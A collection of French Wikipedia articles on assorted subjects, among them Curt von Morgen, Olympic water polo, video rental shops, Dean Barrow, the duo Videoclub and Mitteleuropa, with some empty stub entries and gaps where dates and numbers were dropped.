<doc id="2846429" url="https://fr.wikipedia.org/wiki?curid=2846429" title="Curt von Morgen">
Curt von Morgen

Curt Ernst Morgen (von Morgen en 1904), né le à Neisse en province de Silésie et mort le à Lübeck, est un officier allemand. Lors de sa carrière, il explore de vastes région au Cameroun de 1889 à 1895. Il devient observateur militaire attaché à l'armée britannique lors de la guerre des mahdistes, puis attaché à l'armée turque lors de la guerre gréco-turque. Lors de la Première Guerre mondiale, il est nommé à la tête de la de réserve, puis du de réserve sur le front de l'Est jusqu'à la fin de 1917. Il commande ensuite ce corps d'armée, puis le de réserve sur le front de la Somme.
Biographie.
Premières années.
Morgen intègre école des cadets de Wahlstatt, puis à celle de Berlin. Le 14 avril 1877, il est nommé Fähnrich au d'infanterie. Le 12 octobre 1878, il est nommé sous-lieutenant, puis lieutenant le 13 décembre 1887. Morgen est ensuite détaché de son régiment et rejoint le ministère des Affaires étrangères allemand.
Explorations en Afrique.
Morgen part pour l'Afrique, après la mort du paludisme du lieutenant Tappenbeck, il a pour mission de seconder le lieutenant Kund pour une expédition au sud du Cameroun allemand. Kund tombe malade, Morgen prend la tête de l'expédition et quitte la côte le 5 novembre 1889 avec cent vingt porteurs, ainsi que Martin-Paul Samba, son domestique. Il atteint un mois plus tard le poste de Yaoundé, fondé quelques mois plus tôt par Kund et Tappenbeck. Il en part le 9 décembre pour le fleuve Sanaga qu'il traverse pour se diriger vers le plateau d'Adamaoua. Il part ensuite en direction de l'ouest et découvre le Mbam, affluent de la Sanaga. Il explore ensuite la région des Malimbas, dont la population est proche des Bantous. Pendant quatre mois, Morgen doit se défendre contre des attaques des tribus côtières. Le 2 juin 1890, Morgen débute sa seconde expédition dans l'arrière-pays d'Adamaoua. Il fonde à côté de Ndoumba (chef-lieu de la puissante tribu des Vutes), le nouveau poste de Kaiser-Wilhelmburg. Il explore ensuite les régions de Tibati, Banyo, et Ibi et retourne ensuite vers la côte par Bénoué et le fleuve Niger. Il stationne quelque temps à Lagos avant de rentrer en Allemagne, appelé à de nouvelles fonctions au ministère des Affaires étrangères.
En 1894, Morgen reçoit l'ordre de Caprivi de repartir pour le Kamerun, afin de réorganiser les forces de police, après le déclenchement d'une mutinerie en décembre 1893. Il organise deux expéditions militaires, l'une contre les Abos au nord de Douala, et l'autre chez les Kpés au mont Cameroun.
En 1896-1897, Morgen devient observateur militaire auprès des forces anglaises lors de la guerre des mahdistes notamment lors de la bataille de Firket.
Attaché militaire au Proche-Orient.
En 1897, Morgen est nommé attaché militaire à Constantinople avec le grade de capitaine. Il est à nouveau observateur militaire lors de la guerre gréco-turque, puis il fait partie des officiers chargés de l'organisation du en 1898. Il est nommé aide-de-camp ("Flügeladjutant") à cette occasion, puis major. En 1901, Morgen est affecté au Grand État-major.
Morgen est nommé commandant de bataillon du de grenadiers en janvier 1902. En 1904, Morgen est élevé à la noblesse prussienne et reçoit le droit d'ajouter la particule à son nom. Le 24 avril 1905, il est nommé ' et affecté à l'état-major du de fusiliers stationné à Düsseldorf. Le 21 mars 1908, Morgen est promu ' en 1908 et commande le stationné à Minden. Il devient " en 1912 et commande la d'infanterie à Lübeck.
Première Guerre mondiale.
Au déclenchement de la Première Guerre mondiale, Morgen est nommé à la tête de la de réserve et promu " le 19 août 1914. Il combat avec son unité sur le front de l'Est. Il est engagé dans les batailles de Tannenberg et des lacs de Mazurie. Le 28 novembre 1914, Morgen devient le commandant du corps de réserve, rattaché à la armé allemande. Il combat à Łódź et est décoré pour ses actions de la décoration Pour le Mérite, il occupe avec son corps d'armée un secteur du front le long de la Rawka et la Bzura.
En septembre 1916, Morgen et le corps de réserve sont transférés sur le front roumain et participent à la campagne roumaine. Ils sont en soutien de la armée autro-hongroise vers Făgăraș et participent à la bataille de Brașov du 7 au 9 octobre 1916. Morgen et ses troupes franchissent en novembre le col de Törzburger puis occupent Câmpulung et atteignent Ploiești au mois de décembre. Au printemps 1917, Morgen attaque avec le corps de réserve Focșani. Il est ensuite engagé du 6 août au 3 septembre 1917 dans la bataille de Mărăşeşti. À la fin de l'année 1917, Morgen et le corps de réserve sont transférés sur le front de l'Ouest et rattachés à la armée allemande. Le 24 août 1918, Morgen change de commandement et prend la direction du corps de réserve, il combat sur le front de la Somme jusqu'à la fin du conflit.
Après la guerre.
À la fin de la Première Guerre mondiale, Morgen démissionne de l'armée. Cette démission prend effet le 9 janvier 1919. Il est cependant promu "", le 17 février 1920.
Morgenland reste jusqu'à ses derniers jours un monarchiste convaincu, fidèle à la Maison de Hohenzollern même après 1918. Il meurt des suites de maladie le 15 février 1928, il est enterré au Ehrenfriedhof de Lübeck.
Famille.
Morgen est le père de deux enfants, d'un garçon Heinrich-Joachim von Morgen coureur automobile (1902 à 1932) et d'une fille Sophie qui épouse en 1923 le concepteur d'avion Anthony Fokker.

</doc>
<doc id="2846431" url="https://fr.wikipedia.org/wiki?curid=2846431" title="Water-polo aux Jeux olympiques de 1912">
Water-polo aux Jeux olympiques de 1912

Le tournoi de water-polo aux Jeux olympiques de 1912 ont lieu pendant les épreuves olympiques à Stockholm, en Suède.
Équipes.
45 poloïstes appartenant à 6 nations participèrent aux JO de Stockholm.
Résultats.
Équipe du Royaume-Uni.
Charles Bugbee, Charles Sydney Smith, George Thomson Cornet, Edwin Arthur Hill, George Wilkinson, Paul Radmilovic, Isaac Bentham.
Équipe de Suède.
Torsten Kumfeldt, Harald Julin, Max Gumpel, Pontus Hansson, Robert Andersson, Vilhelm Andersson, Erik Bergqvist.
Équipe de Belgique.
Albert Durant, Herman Meyboom, Victor Boin, Joseph Pletinckx, Félicien Courbet, Oscar Grégoire, Hermann Donners.

</doc>
<doc id="2846434" url="https://fr.wikipedia.org/wiki?curid=2846434" title="Vidéo-club">
Vidéo-club

Un vidéoclub, vidéo-club ou club vidéo, est une boutique de services permettant la location de films (ou plus rarement d'autres productions audiovisuelles telles que des séries télévisées) sur support vidéo (essentiellement cassettes VHS puis DVD, ou plus récemment HD DVD et Blu-ray) afin de les visionner à son domicile, sur son téléviseur, avant de les rapporter.
Modalités de location.
La durée de location est généralement de l'ordre de quelques heures à quelques jours, le temps de visionner le film. Il existe souvent une boîte accessible de l'extérieur de la boutique, pour permettre aux clients de rapporter les vidéos même en dehors des horaires d'ouverture. Des frais supplémentaires peuvent être imputés au client en cas de dépassement de l'heure de retour prévue.
Le client peut être facturé film par film, mais il existe généralement des cartes de fidélité ou des abonnements.
Les prix pratiqués peuvent être plus élevés pour les films sortis récemment.
Organisation du magasin.
Les films sont exposés dans des rayons, classés par genre. Les sorties récentes sont souvent mises en valeur.
En général, afin d'éviter les vols, seule la jaquette est exposée, les enregistrements en eux-mêmes étant alors conservés dans l'arrière-boutique et délivrés seulement au moment du passage à la caisse.
Histoire.
Aux États-Unis, le dernier vidéo-club de Washington, sous l'enseigne Potomac Video, a fermé ses portes en . Les fermetures se multiplient dans de nombreux pays. Alors qu'ils étaient plus de 15 000 loueurs en 2006 aux États-Unis, ils ne sont plus que 6 000 en 2014. 
À la suite de l'arrivée dans le milieu des années 2000 de la vidéo à la demande, du streaming et du téléchargement (légal ou non), les vidéo-clubs ont vu leur chiffre d'affaires chuter jusqu'à par an, selon un rapport du CNC et la baisse de la fréquentation de la clientèle.
C'est pourquoi le nombre de vidéo-club, non seulement en France mais aussi dans le monde, a beaucoup baissé depuis les années 2000.
En France.
En , il ne reste qu'une dizaine de Vidéo-club en France. En 1998, lorsque les premiers films en DVD sont arrivés, qui devaient supplanter la cassette VHS, il y en avait environ . En 2023, l'un des derniers de Paris, JM Vidéo, installé depuis 1982 dans une petite boutique au 121 avenue Parmentier dans le 11e arrondissement possède environ dvd, et le site Konbini y tourne depuis 2018 ses interviews «Vidéo club», où des réalisateurs et acteurs recommandent leurs films préférés. En 2023, plus d'un million d'internautes ont visionné ces visites sur Youtube avec pour invités notamment : Wes Anderson, Bertrand Blier, Claude Lelouch, Terry Gilliam, Agnes Jaoui, Claire Denis, Albert Dupontel, Nanni Moretti, Brad Pitt, Jean-Pierre Jeunet, Michel Gondry, Bong Joon-ho, ou Eddy Mitchell qui présenta l'émission "La Dernière Séance" de 1982 à 1998. L'autre vidéo-club à Paris qui résiste encore en 2023, est le Vidéo Club de la Butte, au 49 rue Caulaincourt dans le 18e arrondissement. Avec titres, il existe depuis 1980. L'un des derniers vidéo-club qui a disparu à Paris, en 2021, est le Vidéosphère, qui depuis 28 ans, était situé au 36 rue des Bernardins, et qui abritait environ VHS et DVD. Henri Moisan, le responsable de Vidéosphère, a préféré transférer les titres à la Bibliothèque nationale de France, plutôt qu’un rachat partiel par un collectionneur. 
En avril 2021, le journal Les Échos fait l'inventaire d'une partie des derniers vidéo-club indépendants qui résistent à Paris mais aussi dans d'autres villes de France. À Marseille, le Vidéodrome 2 : installé depuis 2015 au 49 cours Julien, qui est à la fois un vidé-oclub, une salle de cinéma de 49 places, un bistrot, et une librairie. À Bordeaux, le Yoyo Vidéo, ouvert en 1984 dans le quartier du Grand Parc, situé au 4 rue des frères Portmann. À Le Loroux-Bottereau, le Dan Vidéo ouvert en 1992. À Calais, le Vidéo Pilote, qui a rassemblé titres. Les Échos avait également inventorié le dernier vidéo-club à Lyon, L'Aquarium ciné-café, situé dans le 4e arrondissement, mais il arrête la location de DVD en juillet 2023, pour se recentrer sur d’autres activités, et a mis en vente ses titres. 
Les Français louaient près de 25 millions de films dans le milieu des années 1990. Les dépenses des Français dans les vidéo-clubs ne représentent plus que 29,3 millions d'euros en 2011 contre 39,4 millions en 2010, soit une perte de 25,6% en un an.
Entre 2004 et 2010, près de en France ont fermé, et on n'en compte en 2014 que moins de . Entre 2002 et 2014, la Chambre régionale de commerce et d'industrie d'Ile-de-France estime que le nombre de vidéo-clubs a chuté de 95,8 % en Île-de-France et qu'il n'en reste qu'une dizaine à Paris. En , il n'en restait encore plus qu'une cinquantaine. 
VidéoFutur, qui comptait environ 400 boutiques dans les années 2000, ne compte plus que 37 magasins en 2014. En , il n'en reste plus que 27. La société change de stratégie en lançant une box commerciale par abonnement depuis , la location de DVD et de Blu-ray devenant secondaire. D'autres vidéoclubs indépendants subsistent aussi, notamment dans les grandes agglomérations comme La Onzième heure à Paris (disparu à la mi-2015). La franchise Cinébank, qui proposait un service de distributeurs automatiques de DVD, a disparu fin 2012. 
Ceux qui subsistent diversifient leur offre en vendant des DVD, des figurines ou autres objets de collection en lien avec le cinéma, ou se spécialisent dans des genres cinématographiques.
La pandémie de Covid-19 en France a également fait chuter la location de DVD dans les vidéo-clubs, notamment lors des différents confinements en 2020 et 2021.
En Suisse.
En Suisse romande.
En Suisse romande la chaîne Vidéo Folies a fermé sa dernière succursale en juillet 2018 à Lausanne au chemin de Montolivet. Elle avait déménagé une année auparavant de l'avenue de Montchoisi pour un local moins onéreux. Entre le milieu des années 1980 et 2010, entre 27 et 32 succursales, réparties dans seize villes ont fleuri partout en Romandie, et à part ce dernier magasin, elles avaient toutes mis la clé sous la porte. Fondé par Carlo Pavone, originaire de La Spezia en Italie, il a ouvert son propre magasin Radio TV en 1972, à Lausanne, à la rue de l'Etraz, et plus tard a commencé à installer dans le magasin un rayon avec les premiers films destinés à la location. Quand le commerce d'en face s'est libéré, il s'y est installé pour y fonder le premier Vidéo Folies. En 2006, il comptait 32 vidéoclubs, dont 23 en franchises et avait une part de marché d'environ 30 %.
D'autres vidéo-club indépendants existaient en Suisse romande. À Genève, le dernier vidéo-club, Le Cinoche, ferme le 29 juin 2019 par manque de rentabilité. Pierre-Alain Berettal l'avait fondé en 1984. Il comptait références et était devenu un lieu culturel selon les confidences de son propriétaire. En fin d'année 2016, il avait été sauvé de la fermeture grâce aux Établissements publics pour l'intégration (EPI), qui avaient racheté l'enseigne et employé Pierre-Alain Beretta et son collègue, mais Le Cinoche a continué à voir sa fréquentation s'éroder.
Franchises.
Les vidéo-clubs peuvent être indépendants, ou être organisés en réseaux comme Family Video aux États-Unis, Avenue Video au Canada, Vidéo Futur ou Cinébank en France, ou Blockbuster Inc. dans plusieurs pays.
Bornes ou distributeurs automatiques.
Il existe aussi des bornes automatiques placées en extérieur, sur la voie publique, qui peuvent être rattachées à une boutique classique ou non, et qui délivrent des vidéos sans interruption. Les supports vidéo étant stockés physiquement dans la borne, le nombre de films disponibles est plus faible que dans une boutique. Le choix se fait sur un écran, qui peut être tactile ou disposer de touches pour la sélection. Pour les clients qui bénéficient d'un forfait, le paiement peut être effectué avec la carte magnétique ou à puce qui leur a été fournie lors de la souscription, tandis que les clients occasionnels utilisent leur carte bancaire.
Domaines d'activité.
Certains vidéo-clubs proposent également leurs vidéos à la vente, et se diversifient parfois dans le domaine des jeux vidéo.
Par ailleurs, il existe des vidéo-clubs spécialisés dans la pornographie ; il s'agit souvent de "sex shops" qui vendent aussi des objets sexuels, proposent des "peep shows", et mettent à disposition des cabines individuelles pour regarder les films. Cependant, certains vidéo-clubs traditionnels proposent aussi un rayon pornographique, éventuellement séparé physiquement du reste du magasin, afin d'en limiter l'accès aux seuls majeurs.
Concurrence.
Les vidéo-clubs ont été récemment concurrencés par l'arrivée de sites web comme Glowria ou dvdfly, proposant les mêmes services de location, mais en envoyant et en recevant les DVD par courrier, ce qui dispense le client de se déplacer jusqu'à un vidéo-club.
Une expérience de livraison de vidéo à domicile dans l'heure qui suit la commande, par des coursiers motorisés, est également menée depuis 2002 dans le canton de Genève, par l'entreprise DVDmania, cofondée par le député Antonio Hodgers.
Plus récemment encore, l'explosion de la vidéo à la demande (existant à la fois à la location et à la vente), permet de s'affranchir des délais postaux et de la nécessité du retour de la vidéo.
Certains vidéo-clubs traditionnels se sont d'ailleurs lancés dans ces activités. D'autres proposent de télécharger les vidéos en magasin sur un disque dur portable.
D'autre part, par extension, certains de ces services sont qualifiés de « vidéo-clubs » ou « vidéo-clubs virtuels », à l'instar de Vidéo Club Numericable, le service de vidéo à la demande de Numericable.

</doc>
<doc id="2846435" url="https://fr.wikipedia.org/wiki?curid=2846435" title="Spiritual Warfare">
Spiritual Warfare

Spiritual Warfare est un jeu vidéo de rôle sorti en 1992 sur PC (DOS), Game Boy et Nintendo Entertainment System ; puis, en 1994 sur Mega Drive. Le jeu a été développé et édité par Wisdom Tree, une société de développement et d'édition de jeux vidéo chrétiens.
"Spiritual Warfare" est profondément inspiré par "The Legend of Zelda".

</doc>
<doc id="2846437" url="https://fr.wikipedia.org/wiki?curid=2846437" title="Video-club">
Video-club



</doc>
<doc id="2846438" url="https://fr.wikipedia.org/wiki?curid=2846438" title="Video club">
Video club



</doc>
<doc id="2846439" url="https://fr.wikipedia.org/wiki?curid=2846439" title="Coupe du monde de biathlon 2005-06">
Coupe du monde de biathlon 2005-06



</doc>
<doc id="2846440" url="https://fr.wikipedia.org/wiki?curid=2846440" title="Vidéo club">
Vidéo club



</doc>
<doc id="2846441" url="https://fr.wikipedia.org/wiki?curid=2846441" title="Vidéoclub">
Vidéoclub



</doc>
<doc id="2846442" url="https://fr.wikipedia.org/wiki?curid=2846442" title="Dean Barrow">
Dean Barrow

Dean Barrow, né le à Belize, est un homme politique bélizien. Premier ministre du Belize de 2008 à 2020 et ancien ministre des Finances, il est également le dirigeant du Parti démocratique uni depuis 1998.
Biographie.
Études.
Dean Barrow suit des études de droit à l'université des Indes occidentales puis de droit et de relations internationales à l'université de Miami dont il sort diplômé en 1981. De retour au Belize, il devient avocat et fonde son propre cabinet au début des années 1980. Parmi ses clients, il compte le controversé Michael Ashcroft, homme d'affaires et homme politique britannico-bélizien.
Débuts en politique.
Barrow fait son entrée en politique en 1983, date à laquelle il est élu au conseil municipal de la ville de Belize. L'année suivante, il est élu député et devint procureur général et ministre des Affaires étrangères dans le premier gouvernement de Manuel Esquivel. Membre de l'opposition de 1989 à 1993, il revient ensuite au gouvernement comme vice-Premier ministre et ministre des Affaires étrangères de 1993 à 1998, dans le second gouvernement de Manuel Esquivel. 
Premier ministre.
Il est leader de l'UDP et le chef de l'opposition pendant dix ans, jusqu'à la victoire de son parti aux élections de 2008. Le Parti démocratique uni remporte alors 25 sièges sur 31 et Barrow devient le premier dirigeant noir de son pays. Il est reconduit à son poste à la suite de la victoire de son parti lors des élections législatives de 2012. Pour les questions sociétales, il est notamment opposé à la révision de la loi punissant de 10 ans de prison les relations homosexuelles.
Famille.
Dean Barrow est le père de Moses Barrow, ancien rappeur connu sous le nom de Shyne et désormais homme politique bélizien.

</doc>
<doc id="2846443" url="https://fr.wikipedia.org/wiki?curid=2846443" title="Videoclub">
Videoclub

Videoclub est un duo d'electropop français actif de 2018 à 2021, formé par Adèle Castillon et Matthieu Reynaud, son petit ami de l'époque, à Nantes (Loire-Atlantique).
Après le succès remarqué à l'international de son titre "Amour plastique", le groupe sort un album studio, intitulé "Euphories".
Biographie.
Enfance d'Adèle Castillon.
Adèle Castillon naît le dans une famille d'artistes. Elle connaît le succès avec sa chaîne YouTube lancée alors qu'elle a treize ans, avant de devenir actrice à quinze ans. Elle joue dans "Sous le même toit" (2017), puis dans "L'Heure de la sortie" (2019).
Enfance de Matthieu Reynaud.
Matthieu Reynaud est le fils d'un ancien guitariste professionnel, Régis Reynaud, qui lui transmet sa passion pour la musique. Il apprend à jouer de plusieurs instruments et compose et enregistre alors qu'il est adolescent en utilisant le matériel de son père.
Histoire du duo.
Matthieu Reynaud rencontre Adèle Castillon à Nantes en 2018. Alors qu'il a composé la musique d"'Amour plastique" en séchant les cours de sport, il lui envoie la maquette pour tenter de la séduire, en lui demandant de chanter dessus sur des paroles écrites par leur ami Esteban Capron. Par la suite, le groupe se resserre sur leur couple et se baptise Videoclub, un nom que Matthieu avait déjà imaginé pour son futur groupe mais qu'ils justifient parfois en raison d'une passion commune pour le cinéma. Le duo enregistre la chanson "Amour plastique" dans le salon du père de Matthieu, tandis que Julie, la grande sœur de Matthieu, réalise le vidéoclip de la chanson. Mis en ligne sur YouTube en septembre 2018, le clip connaît un succès rapide, en partie grâce à la notoriété existante d'Adèle sur la plateforme vidéo. Le compte du groupe atteint en effet les au bout d'une semaine, avant même la publication du vidéoclip, ce qui attire l'attention de YouTube. Après sa publication, le videoclip atteint les 22 millions de vues en août 2019 et les 60 millions de vues en février 2021.
Le groupe sort ensuite d'autres titres comme "Roi" et "En nuit", et à partir de ce dernier, commence à écrire ses propres textes. Le groupe se produit lors d'un premier concert qui se joue à guichet fermé le à Nantes. Il entame une première tournée l'été 2019. Adèle Castillon et Matthieu Reynaud se produisent notamment à l'Unaltrofestival à Milan et au Delta Festival à Marseille. Ils sont également programmés au festival "Cabourg mon amour", fin juin 2019. En janvier 2020, ils affichent plusieurs dates complètes à Paris et se produisent au festival des Francofolies à la Réunion le 7 mars 2020.
Le , le single "Amour plastique" est certifié or au Mexique. Le duo signe un contrat de distribution avec Sony Music. Initialement prévu pour 2020, le premier album de Videoclub, intitulé "Euphories", sort le .
Le , Videoclub publie la vidéo du titre "SMS", dont l'épilogue annonce la séparation du groupe, les derniers concerts programmés étant assurés par la seule Adèle Castillon.
L'album "Euphories" est certifié disque d'or en France le 13 mars 2025.
Séparation.
En 2021, le duo se sépare et Adèle Castillon poursuit sa carrière en solo.
En 2022, Matthieu Reynaud entame à son tour une carrière solo sous le nom de scène de Mattyeux.
Style musical.
Leur style musical se définit comme de l'électropop, avec un côté rétro et une importante influence des années 1980. Ils chantent principalement en français et occasionnellement en anglais. Matthieu Reynaud compose et produit la musique, les textes sont écrits à deux.

</doc>
<doc id="2846445" url="https://fr.wikipedia.org/wiki?curid=2846445" title="Coupe du Monde de biathlon 2004-05">
Coupe du Monde de biathlon 2004-05



</doc>
<doc id="2846448" url="https://fr.wikipedia.org/wiki?curid=2846448" title="Ambulance Nouveau-Brunswick">
Ambulance Nouveau-Brunswick

Ambulance Nouveau-Brunswick est une société de la couronne néo-brunswickoise. Créée en 2007, elle fournit des services d'ambulance aériens et terrestres sur tout le territoire de la province.

</doc>
<doc id="2846451" url="https://fr.wikipedia.org/wiki?curid=2846451" title="Strawberry Weed">
Strawberry Weed

Strawberry Weed est un double album, le du groupe suédois Caesars.

</doc>
<doc id="2846459" url="https://fr.wikipedia.org/wiki?curid=2846459" title="Water-polo aux Jeux olympiques de 1904">
Water-polo aux Jeux olympiques de 1904

Résultats du tournoi olympique masculin de water-polo aux Jeux olympiques de 1904 à Saint-Louis. Seules trois équipes américaines participent aux compétitions considérées comme officielles par le CIO. Une équipe allemande avait envisagé de participer au tournoi mais y a renoncé en raison des règles adoptées qui étaient celles américaines, plus proches du rugby, que celles britanniques.
Résultats.
Médaillés.
Équipe de New York.
David Bratton, George Van Cleaf, Leo Goodwin, Louis Handley, David Hesser, Joseph Ruddy, James Steen.
Équipe de Chicago.
Rex Beach, Jerome Steever, Edwin Swatek, Charles Healy, Frank Kehoe, David Hammond, William Tuttle.
Équipe du Missouri.
John Meyers, Manfred Toeppen, Gwynne Evans, Amedee Reyburn, Fred Schreiner, Augustus Goessling
William Orthwein.

</doc>
<doc id="2846461" url="https://fr.wikipedia.org/wiki?curid=2846461" title="Metzgeria conjugata">
Metzgeria conjugata

Metzgeria conjugata est une espèce d'hépatiques appartenant à la classe des "Jungermanniopsida" (hépatiques à lobes) ou à celle des "Hepatopsida" selon les classifications et à l'ordre des "Metzgeriales".
On la trouve parfois comme épiphyte corticole, c'est-à-dire sur les écorces d'arbres, notamment de frênes dans certaines vallées forestières humides. Mais cette espèce est plus rarement corticole que "Metzgeria furcata".
Habitat.
Creux humides et zones boisées humides (notamment dans les hautes terres du nord et de l'ouest de la Grande-Bretagne).
Elle apprécie les substrats calcaires, tout comme "Ctenidium molluscum" ou "Trichostomum brachydontium" qui lui sont souvent associées.
Menaces.
C’est une plante discrète et complètement menacée par la régression des milieux frais et humides.

</doc>
<doc id="2846462" url="https://fr.wikipedia.org/wiki?curid=2846462" title="Khotkovo">
Khotkovo

Khotkovo (en ) est une ville de l'oblast de Moscou, en Russie. Sa population s'élevait à habitants en 2017.
Géographie.
Khotkovo est située sur la rivière Moskva, à au nord de Moscou et à au sud-ouest de Serguiev Possad, centre administratif du raïon dont Khotkovo fait partie.
Histoire.
La première mention de Khotkovo remonte à l'année 1308. Khotkovo reçut le statut de commune urbaine en 1938 puis celui de ville en 1949. La localité est connue comme le site d'un monastère, fondé par les parents du grand saint Serge de Radonège. La communauté d'artistes d'Abramtsevo () est située à cinq kilomètres de Khotkovo.
Population.
Recensements (*) ou estimations de la population
Économie.
La principale entreprise industrielle de la ville est : AOOT Teploïzoplit () : matériaux d'isolation.

</doc>
<doc id="2846463" url="https://fr.wikipedia.org/wiki?curid=2846463" title="Jungermanniales">
Jungermanniales

Les Jungermanniales sont un ordre d'hépatiques de la classe des Jungermanniopsida (hépatiques à lobes).
Liste des sous-ordres et familles.
Selon :
Selon :

</doc>
<doc id="2846464" url="https://fr.wikipedia.org/wiki?curid=2846464" title="Han Seung Soo">
Han Seung Soo



</doc>
<doc id="2846465" url="https://fr.wikipedia.org/wiki?curid=2846465" title="Sink or Swim">
Sink or Swim

Sink or Swim est un jeu vidéo d'action et de réflexion développé et édité par Zeppelin Games, sorti en 1993 sur Amiga et PC (DOS). Il a été adapté sur Super Nintendo ("S.O.S.: Sink or Swim") et Mega Drive et Game Gear ("S.S. Lucifer Man Overboard!") en 1994.

</doc>
<doc id="2846467" url="https://fr.wikipedia.org/wiki?curid=2846467" title="Xianying Liu">
Xianying Liu



</doc>
<doc id="2846469" url="https://fr.wikipedia.org/wiki?curid=2846469" title="Mitteleuropa">
Mitteleuropa

Mitteleuropa est un terme pour désigner une certaine région au milieu de l'Europe subtilement distincte de l'Europe centrale. Plus ou moins étendu selon les périodes, cet espace historique a constitué l'objet de convoitises de la part des grandes puissances européennes depuis les années 1860. En effet, l'état intérieur de l'Empire ottoman ne permet plus de tenir à distance les appétits russes, l'Empire autrichien, malgré sa rénovation dans les années 1860, n'est plus en mesure d'exploiter pour son compte la décrépitude ottomane, et le "" s'affirme comme le principal successeur des ambitions autrichiennes, puis austro-hongroises en Europe du Sud-Est.
L'Empire allemand se lance ainsi dès les années 1870 dans une lutte pour la suprématie politique et économique de cet espace géographique. Pendant la Première Guerre mondiale, les traités conclus au cours des deux dernières années du conflit entre l’Allemagne et l’Autriche-Hongrie font de cette aspiration une réalité, remise en cause par la défaite de 1918.
En 1933, une nouvelle impulsion est donnée aux projets d'expansion allemande vers le sud-est de l'Europe.
Définition.
Selon Jacques Le Rider, &lt;ref name="Le Rider/eu"&gt;Jacques Le Rider, .&lt;/ref&gt;. Outre le contexte géopolitique auquel il renvoie, le mot désigne .
Pour Yaël Hirsch, la « Mitteleuropa » renvoie à une Europe centrale aux contours flous. Géographiquement, elle inclut à la fois Berlin, Bucarest et les villes situées le long du Danube. Politiquement, elle constitue avant tout une tentative de mise en place de l'hégémonie du "Reich" sur les Balkans ; en effet, la notion apparaît en 1915 sous la plume de Friedrich Naumann. La Mitteleuropa est avant tout un , une sorte d'âge d'or, remis en cause par la Shoah et le Rideau de fer, cette dimension garantissant au concept une faculté permanente d'évolution et d'adaptation au fil des époques et des auteurs. Cela l'a rendu difficile à définir et à cerner.
Histoire de la notion.
Naissance.
En 1842, les premiers projets d'union danubienne sont formalisés, sous la forme d'une réflexion du géographe Friedrich List, qui propose en effet la mise en place d'un projet d'union douanière doublé de vastes entreprises de colonisation germanique en Europe centrale. Ces conclusions sont reprises quelques années plus tard par Paul de Lagarde, qui les popularise, les développe et aspire à la constitution d'un Grand Reich, du Luxembourg à la mer Noire, basé sur une austro-allemande.
Dès le traité de Paris, en 1856, sanctionnant la défaite russe en Crimée, il apparaît à l'Autriche que l'Empire ottoman commence à se décomposer de l'intérieur, notamment dans les Balkans.
Dans un contexte marqué par une forte croissance industrielle allemande dans les années 1880 et 1890, les partisans de l'hégémonie du "Reich" sur l'Europe s'expriment, notamment chez des impérialistes allemands, regroupés notamment au sein de la ligue pangermaniste et de la ligue navale. Dans le même temps, à la suite de leur exclusion de l'Italie puis de la constitution de l'empire allemand, les Habsbourg voient l'expansion de leur État limité à l'Europe centrale et balkanique. De plus, dans les années 1870, marqué par la perception d'une menace russe s'appuyant sur le panslavisme, Paul de Lagarde préconise la constitution d'une , incluant l'Allemagne, la Pologne annexée, la double monarchie et les rivages de la mer Noire, régions plus ou moins promises à une germanisation future.
Dans le même ordre d'idées, afin d'éviter de se faire déborder par les milieux pangermanistes, Guillaume II et son chancelier, Bernhard von Bülow, proclament en 1903 et 1904 que le sera nécessairement un .
Au fil des années, la dépendance accrue de la monarchie danubienne à l'égard de l'Allemagne crée les conditions d'une mise sous tutelle non seulement politique mais aussi économique de la double monarchie à l'égard de son allié, de plus en plus entreprenant au fil des années. Ainsi, la Duplice est selon Otto von Bismarck un moyen de contrôler la politique étrangère de la double monarchie et de l'orienter ainsi vers les Balkans. Dans les dernières années du et au début du , toute la politique du "Reich" vise à remettre en cause les termes du traité de Prague en incitant l'Austriche-Hongrie à diriger son effort expansionniste vers les Balkans.
Ambitions divergentes de l'Allemagne et de l'Autriche-Hongrie jusqu'en 1918.
Le concept de Mitteleuropa fait l'objet d'appréciations divergentes en fonction des rapports de rivalité ou d'alliance entre les deux principales puissances de la région. Pour les uns, le centre de ce regroupement doit être Vienne, autour d'un État majoritairement catholique, pour les autres Berlin. Cependant, le royaume de Prusse, devenu à partir de 1870 la puissance dominante de l'Empire allemand, s'appuie sur son industrie pour bâtir un empire économique au centre de l'Europe.
Au cours du , la montée en puissance prussienne, puis allemande, dans la région entraîne de nombreuses réticences en Autriche. Dans les années 1830, Metternich s'oppose aux milieux industriels autrichiens réservés sur l'entrée de l'Autriche dans le "Zollverein", qui sont conscients des faiblesses économiques de la monarchie danubienne face à la Prusse.
Dans les années 1860, les principaux acteurs de la politique balkanique jouent les uns contre les autres, à une période de recomposition du jeu entre les puissances.
En 1866, la crise roumaine, qui aboutit à la mise en place d'une principauté autonome unique, et la défaite autrichienne à Sadowa incitent les puissances à poser les termes du partage définitif de la péninsule balkanique en zones d'influence allemande et russe.
Dans les années 1880, certains responsables politiques, tant dans l'Empire allemand que dans la double monarchie, se montrent de fervents partisans de l'institutionnalisation de l'alliance privilégiée entre ces deux État (Duplice). Aux yeux des partisans d'un tel rapprochement, cette politique doit également se renforcer de l'importance de l'élément ethnique allemand au sein de la double monarchie. Dans les années qui précèdent immédiatement la Première Guerre mondiale, les débats entre les différents promoteurs de cette idée s'organisent autour du rôle et des prérogatives de la puissance dominante de cet ensemble.
De 1895 à 1897, le déclin de l'Empire ottoman, qui perd le contrôle de ses provinces balkaniques, aiguise les rivalités entre l'Empire russe, l'Allemagne et l'Autriche-Hongrie. En 1897, les gouvernements russe et austro-hongrois s'entendent provisoirement pour geler les rapports de force dans les Balkans.
En 1912, dans son ouvrage à succès "", ("L'Allemagne et la prochaine guerre"), Friedrich von Bernhardi pense la constitution d'un ensemble en Europe centrale sous domination allemande comme l'une des principales conditions à réunir pour faire du "Reich" une puissance mondiale.
Dans les années précédant la Première Guerre mondiale, particulièrement à partir du traité de Bucarest de 1913, qui termine la deuxième guerre balkanique, les ambitions allemandes dans la région sont directement remises en cause par le manque de capitaux qui affecte l'économie de l'Empire allemand. En effet, l'Allemagne, principale bénéficiaire de la politique mis en place depuis les années 1870, ne peut plus satisfaire les demandes de capitaux de ses alliés, qui, notamment la Roumanie, où règne un prince de la maison de Hohenzollern, et l'Empire ottoman, sont amenés à se tourner vers la France et le Royaume-Uni pour leurs demandes de financement. Cette lutte d'influence économique se double d'une rivalité stratégique puisque la Grèce, la Serbie et la Roumanie se rapprochent de la Triple Entente franco-russo-britannique, qui est dirigée contre la Duplice.
